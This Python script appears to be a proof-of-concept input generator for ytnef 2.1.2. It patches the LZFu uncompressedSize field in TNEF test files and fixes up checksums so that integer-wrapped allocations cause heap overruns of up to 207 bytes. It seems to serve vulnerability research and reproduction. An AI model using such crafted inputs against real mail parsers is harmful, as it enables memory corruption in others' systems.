#!/usr/bin/env python3
"""Craft TNEF inputs by patching the LZFu stream header of upstream test-data.

The TNEF attribute layout is left intact: only the four-byte uncompressedSize
field of an existing compressed-RTF MAPI property is replaced, and the owning
attribute's 16-bit data checksum is recomputed, so both the library's
`compressedSize == property_size - 4` check and `TNEFParse()` checksum check
pass. No network, no mail.

Framing verified against lib/ytnef.c v2.1.2 on `rtf.tnef`: 4-byte signature,
2-byte key, then [level 1 | type 4 LE | size 4 LE | data size | checksum 2 LE].
SwapDWord/SwapWord are no-ops on this little-endian host. TNEFRawRead computes
the checksum as the wrapping 16-bit sum of the attribute data bytes only.
"""
import hashlib
import pathlib
import struct
import sys

ROOT = pathlib.Path(__file__).resolve().parent
SRC = ROOT / "src" / "ytnef-2.1.2" / "test-data"
OUT = ROOT / "inputs"
OUT.mkdir(exist_ok=True)

CASES = {
    "wrap16": (0xFFFFFF41, b"LZFu"),   # calloc(207+0xFFFFFF41)=16, 191-byte overrun
    "wrap0": (0xFFFFFF31, b"LZFu"),    # calloc(0), 207-byte overrun
    "wrap206": (0xFFFFFFFF, b"LZFu"),  # calloc(206), 1-byte overrun
    "mela": (64, b"MELA"),             # uncompressed branch, 64-byte read
}


def attributes(data):
    """Yield (type, data_start, data_end) for each TNEF attribute."""
    pos = 6
    while pos + 9 <= len(data):
        atype = struct.unpack_from("<I", data, pos + 1)[0]
        size = struct.unpack_from("<I", data, pos + 5)[0]
        start = pos + 9
        end = start + size
        if size == 0 or end + 2 > len(data):
            raise SystemExit(f"attribute at 0x{pos:x} invalid: type={atype:#x} size={size}")
        yield atype, start, end
        pos = end + 2


def fix_checksum(data, start, end):
    csum = sum(data[start:end]) & 0xFFFF
    struct.pack_into("<H", data, end, csum)
    return csum


def craft(name, case):
    data = bytearray((SRC / name).read_bytes())
    size, magic = CASES[case]
    pos = data.find(b"LZFu")
    if pos < 0:
        raise SystemExit(f"{name}: no LZFu stream")
    owner = [(t, s, e) for t, s, e in attributes(data) if s <= pos < e]
    if len(owner) != 1:
        raise SystemExit(f"{name}: LZFu at 0x{pos:x} in {len(owner)} attributes")
    atype, dstart, dend = owner[0]
    old_csum = struct.unpack_from("<H", data, dend)[0]
    off = pos - 4                             # uncompressedSize field
    csize = struct.unpack_from("<I", data, pos - 8)[0]
    old = struct.unpack_from("<I", data, off)[0]
    struct.pack_into("<I", data, off, size)
    data[pos:pos + 4] = magic
    new_csum = fix_checksum(data, dstart, dend)
    out = OUT / f"{pathlib.Path(name).stem}-{case}.dat"
    out.write_bytes(data)
    line = (f"{out.name} src={name} len={len(data)} attr_type=0x{atype:x} "
            f"attr_data=0x{dstart:x}:0x{dend:x} lzfu_magic=0x{pos:x} "
            f"usize_off=0x{off:x} csize={csize} old_usize={old:#x} "
            f"new_usize={size:#x} magic={magic.decode()} "
            f"checksum={old_csum:#x}->{new_csum:#x} "
            f"sha256={hashlib.sha256(data).hexdigest()}")
    print(line)
    return line


def copy_safe(name):
    data = (SRC / name).read_bytes()
    out = OUT / f"{pathlib.Path(name).stem}-safe.dat"
    out.write_bytes(data)
    line = (f"{out.name} src={name} len={len(data)} unmodified "
            f"sha256={hashlib.sha256(data).hexdigest()}")
    print(line)
    return line


if __name__ == "__main__":
    names = sys.argv[1:] or ["rtf.tnef", "winmail.dat"]
    lines = []
    for n in names:
        lines.append(copy_safe(n))
        for c in CASES:
            lines.append(craft(n, c))
    (OUT / "MANIFEST.txt").write_text("\n".join(lines) + "\n")
